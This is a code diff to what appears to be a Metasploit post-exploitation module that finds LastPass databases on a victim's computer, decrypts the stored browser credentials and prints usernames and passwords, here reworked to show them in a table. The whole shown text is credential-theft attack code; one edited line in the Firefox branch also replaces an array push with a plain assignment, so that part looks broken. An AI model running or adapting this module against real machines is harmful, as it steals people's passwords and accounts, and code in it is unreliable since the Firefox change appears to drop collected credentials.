@@ -26,6 +26,8 @@ class Metasploit3 < Msf::Post
       return
     end
 
+    credentials_table = Rex::Ui::Text::Table.new('Header' => "LastPass credentials", 'Indent' => 1, 'Columns' => ["Username", "Password"])
+
     print_status "Searching for LastPass databases..."
 
     db_paths = database_paths # Find databases and get the remote paths
@@ -47,7 +49,7 @@ class Metasploit3 < Msf::Post
         firefox_encoded_creds = firefox_credentials(loot_path)
         next unless firefox_encoded_creds
         firefox_encoded_creds.each do |creds|
-          credentials.push([URI.unescape(creds[0]), URI.unescape(creds[1])]) unless creds[0].nil? || creds[1].nil?
+          credentials = [URI.unescape(creds[0]), URI.unescape(creds[1])] unless creds[0].nil? || creds[1].nil?
         end
 
       else # Chrome, Safari and Opera
@@ -64,10 +66,10 @@ class Metasploit3 < Msf::Post
       credentials.each do |row| # Decrypt passwords
         print_status "Decrypting password for user #{row[0]}..."
         password = clear_text_password(row[0], row[1])
-        print_good("Username: '#{row[0]}' => Password: '#{password}' (Discard outer single quotes)") unless password.blank?
-        print_line ""
+        credentials_table << [row[0], password]
       end
     end
+    print_good credentials_table.to_s
   end
 
   # Finds the databases in the victim's machine
@@ -78,8 +80,6 @@ class Metasploit3 < Msf::Post
 
     case platform
     when /win/
-      os = session.sys.config.sysinfo['OS']
-
       existing_profiles.each do |user_profile|
         print_status "Found user: #{user_profile['UserName']}"
 
@@ -157,7 +157,7 @@ class Metasploit3 < Msf::Post
           file_paths = ["#{profile_path}\\prefs.js"]
           found_dbs_paths.push(file_paths)
         end
-      end    
+      end
     else
       file_paths = file_paths(path, browser)
       found_dbs_paths.push(file_paths) unless file_paths.nil?
@@ -165,8 +165,6 @@ class Metasploit3 < Msf::Post
 
     found_dbs_paths
   end
-
-
 
   # Returns the relevant information from user profiles
   def user_profiles
